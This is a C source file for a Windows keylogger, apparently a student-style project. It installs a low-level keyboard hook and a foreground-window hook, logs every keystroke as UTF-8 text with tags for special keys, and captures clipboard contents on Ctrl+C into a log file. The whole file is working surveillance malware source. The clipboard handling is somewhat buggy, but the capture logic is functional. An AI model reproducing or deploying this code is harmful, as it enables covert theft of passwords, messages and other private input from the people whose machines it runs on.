#include "winkey.h"
#include <debugapi.h>
#include <winbase.h>
#include <winerror.h>

// add this line or add user32.lib on Makefile
//#pragma comment(lib, "user32.lib")

/*
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD     vkCode;       A virtual-key code. The code must be a value in the range 1 to 254.
    DWORD     scanCode;     A hardware scan code for the key.
    DWORD     flags;        The extended-key flag, event-injected flags, context code, and transition-state flag.
    DWORD     time;         The time stamp for this message, equivalent to what GetMessageTime would return for this message.
    ULONG_PTR dwExtraInfo;  Additional information associated with the message.
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

HWND LOG_FD = NULL;

void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
{
	UNREFERENCED_PARAMETER(hWinEventHook);
	UNREFERENCED_PARAMETER(idObject);
	UNREFERENCED_PARAMETER(idChild);
	UNREFERENCED_PARAMETER(dwEventThread);
	UNREFERENCED_PARAMETER(dwmsEventTime);

	if (event == EVENT_SYSTEM_FOREGROUND)
		_GetForegroundWindow(hwnd);
}

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{

    // kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);

    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    DWORD   kCode = 0;
    // (void)GetClipboardData(NULL);
    if (wParam == WM_KEYDOWN)
    {
        char inputLog[64];
        switch(pkey->vkCode)
        {
            case VK_SPACE:
                sprintf_s(inputLog, sizeof(inputLog), "[SPACE]");
				WriteToFile(inputLog);
                break ;
            case VK_RETURN:
                sprintf_s(inputLog, sizeof(inputLog), "[ENTER]");
				WriteToFile(inputLog);
                break ;
            case VK_BACK:
                sprintf_s(inputLog, sizeof(inputLog), "[BACKSPACE]");
				WriteToFile(inputLog);
                break ;
            case VK_LCONTROL:
                sprintf_s(inputLog, sizeof(inputLog), "[LCTRL]");
                WriteToFile(inputLog);
                break ;
            default:
                kCode = pkey->vkCode;
				BYTE keyboardState[256];
				GetKeyboardState(keyboardState);
				// Convert the virtual key code to a character
				WCHAR unicodeBuffer[5];
				int res = ToUnicode(kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);
				if (res > 0)
				{
					// Convert the wide character to UTF-8
					unicodeBuffer[res] = L'\0';
					char utf8Buffer[16];
					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
					if (bytesWritten > 0)
						WriteToFile(utf8Buffer);
				}
                if (GetAsyncKeyState(VK_LCONTROL) && kCode == 'C') // c moche
                {
                    DBG("LCTRL + C");
                    if (GetClipboardData(CF_TEXT) != 0)
                        EmptyClipboard();
                    if (!OpenClipboard(NULL))
                        return 1;
                    HANDLE clipB = GetClipboardData(CF_TEXT);
                    if (!clipB)
                        CloseClipboard();
                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", (char*)GlobalLock(clipB));
                    WriteToFile(inputLog);
                    GlobalUnlock(clipB);
                    CloseClipboard();
                }
                break ;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nShowCmd);

    CreateLogFile();

    HWINEVENTHOOK hook = SetWinEventHook(
                            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
                            NULL,
                            win_foreground,
                            0, 0,
                            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	if (!hook)
		return ERROR_HOOK_NOT_INSTALLED;

    HHOOK hhook = SetWindowsHookExW(
                            WH_KEYBOARD_LL,
                            hook_proc,
                            NULL,
                            0);

    if (!hhook)
    {
        DBG("Hook wasn't installed\n");
        return ERROR_HOOK_NOT_INSTALLED;
    }
    DBG("Hook was installed\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

	UnhookWinEvent(hook);
	UnhookWindowsHookEx(hhook);
    return ERROR_SUCCESS;
}